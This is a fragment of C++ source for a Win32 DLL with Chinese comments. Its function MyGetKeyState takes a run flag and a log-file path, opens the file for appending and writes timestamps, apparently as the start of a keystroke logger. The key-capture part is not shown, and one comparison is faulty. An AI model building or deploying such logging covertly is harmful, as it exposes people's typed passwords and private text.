...
using namespace std;
static bool myIsRun = false;
const static int KeyBoardValue = 0x80000000;
...
WIN32PROJECT1_API int SetIsRun(char* isRun)
{
	if (trim(isRun).empty())
	{
		string message = isRun;
		message = "Win32Project1.cpp->SetIsRun isRun为NULL，其值为："+message;
		MessageBox(NULL, message.data(), "Error", MB_OK);
		return myError;
	}
	if (strcmp("true", trim(isRun).data()) == 0)
	{
		myIsRun = true;
	}
	else
...
WIN32PROJECT1_API int MyGetKeyState(char* isRun, char* filePath)
{
	if (trim(isRun).empty() || trim(filePath).empty())
	{
		return myError;
	}
	//函数 strcmp(s1,s2) 对字符串s1和s2进行比较，返回比较结果－－相等返回0，s1>s2时返回正数，s1<s2时返回负数 
	if (strcmp(isRun, trim(isRun).data())==0)
	{
		myIsRun = true;
	}
	else
		myIsRun = false;
	string FileName = trim(filePath);
	static string KeyName = "";
	static fstream FileStream;
	FileStream.open(FileName.c_str(), std::fstream::out | std::fstream::app);
	string timeStr = "\n\r"+getTime()+"  ";
	FileStream.write(timeStr.data(), timeStr.length());
